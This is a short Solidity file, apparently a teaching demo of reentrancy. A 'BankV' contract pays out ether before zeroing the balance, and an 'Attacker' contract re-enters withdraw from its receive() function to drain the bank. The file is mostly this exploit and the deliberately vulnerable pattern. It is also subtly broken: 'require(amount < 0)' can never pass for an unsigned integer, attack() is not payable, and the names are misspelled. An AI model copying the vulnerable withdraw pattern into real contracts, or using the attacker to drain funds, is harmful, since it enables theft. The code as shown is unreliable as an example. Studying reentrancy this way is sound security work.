// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract BankV{

    mapping (address => uint) public Balance;

    function diposit ( ) public payable {
        Balance[msg.sender] += msg.value;
    }

    function withdrow (  ) public {
        uint amount = Balance[msg.sender];
        require(amount < 0, "Not Enough Balance");

        (bool sent,) = msg.sender.call {value : amount}("");
        require(sent, "Failed");

        Balance [msg.sender] = 0;
    }
}

contract Attacker {
    BankV public bank;

    constructor (address bankAddress){
            bank = BankV(bankAddress);
    }

    function attack () public {
        bank.diposit{value : 1 ether}();
        bank.withdrow();
    }

    receive() external payable { 
        if (address(bank).balance >= 1 ether){
                bank.withdrow();
        }
    }
}